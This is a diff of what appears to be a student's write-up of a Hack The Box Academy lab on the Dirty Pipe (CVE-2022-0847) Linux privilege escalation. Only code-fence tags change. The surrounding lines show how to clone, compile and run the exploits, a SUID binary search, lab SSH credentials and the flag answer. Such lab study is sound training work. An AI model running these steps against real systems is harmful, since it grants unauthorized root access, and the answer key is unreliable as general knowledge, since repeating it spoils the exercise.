@@ -5,7 +5,7 @@ In simple terms, this vulnerability allows a user to write to arbitrary files as
 
 ## Download Dirty Pipe Exploit
 
-```sh
+```shellsession
 $ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
 $ cd CVE-2022-0847-DirtyPipe-Exploits
 $ bash compile.sh
@@ -13,7 +13,7 @@ $ bash compile.sh
 
 After compiling the code, we have two different exploits available. The first exploit version (`exploit-1`) modifies the `/etc/passwd` and gives us a prompt with root privileges. For this, we need to verify the kernel version and then execute the exploit.
 
-```sh
+```shellsession
 $ uname -r
 
 5.13.0-46-generic
@@ -31,7 +31,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 With the help of the 2nd exploit version (`exploit-2`), we can execute SUID binaries (binaries that let user run with the temporary privilege of the file's owner) with root privileges. However, before we can do that, we first need to find these SUID binaries. For this, we can use the following command:
 
-```sh
+```shellsession
 $ find / -perm -4000 2>/dev/null
 
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
@@ -69,12 +69,12 @@ uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plug
 SSH to 10.129.204.55 (ACADEMY-LLPE-DIRTY), with user `htb-student` and password `HTB_@cademy_stdnt!`
 1. Escalate the privileges and submit the contents of flag.txt as the answer. **Answer: HTB{D1rTy_DiR7Y}**
    - Target kernel is vulnerable to Dirty Pipe:
-        ```sh
+        ```shellsession
         $ uname -r
         5.15.0-051500-generic
         ```
    - Clone the PoC and transfer it to target:
-        ```sh
+        ```shellsession
         $ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
         $ cd CVE-2022-0847-DirtyPipe-Exploits
         $ scp compile.sh  htb-student@10.129.204.55:/tmp
@@ -82,7 +82,7 @@ SSH to 10.129.204.55 (ACADEMY-LLPE-DIRTY), with user `htb-student` and password 
         $ scp exploit-2.c  htb-student@10.129.204.55:/tmp
         ```
    - Run the exploit and read the flag: 
-        ```sh
+        ```shellsession
         $ cd /tmp
         $ bash compile.sh
         ./exploit-1
